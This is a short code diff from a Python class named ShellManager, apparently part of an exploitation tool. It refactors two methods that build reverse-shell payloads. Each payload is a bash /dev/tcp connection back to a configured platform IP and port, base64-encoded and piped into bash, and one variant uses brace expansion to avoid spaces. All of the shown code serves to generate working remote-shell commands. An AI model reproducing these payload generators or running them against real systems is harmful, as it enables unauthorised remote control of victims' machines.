@@ -62,14 +62,14 @@ class ShellManager:
     def generate_payload1(self):
         reverse_shell_payload = f'''bash -i 5<> /dev/tcp/{self.platform_ip}/{self.reverse_port} 0<&5 1>&5 2>&5'''
         b64_payload = b64encode(reverse_shell_payload.encode()).decode()
-        payload = '''bash -c {echo,%s}|{base64,-d}|bash ''' % b64_payload
+        payload = f'''bash -c {{echo,{b64_payload}}}|{{base64,-d}}|bash '''
         self.logger.debug(f'Generated Reverse Shell Payload: {payload}')
         return payload
 
     def generate_payload2(self):
         reverse_shell_payload = f'''bash -i 5<> /dev/tcp/{self.platform_ip}/{self.reverse_port} 0<&5 1>&5 2>&5'''
         b64_payload = b64encode(reverse_shell_payload.encode()).decode()
-        payload = '''echo %s|base64 -d|bash''' % b64_payload
+        payload = f'''echo {b64_payload}|base64 -d|bash'''
         self.logger.debug(f'Generated Reverse Shell Payload: {payload}')
         return payload
 
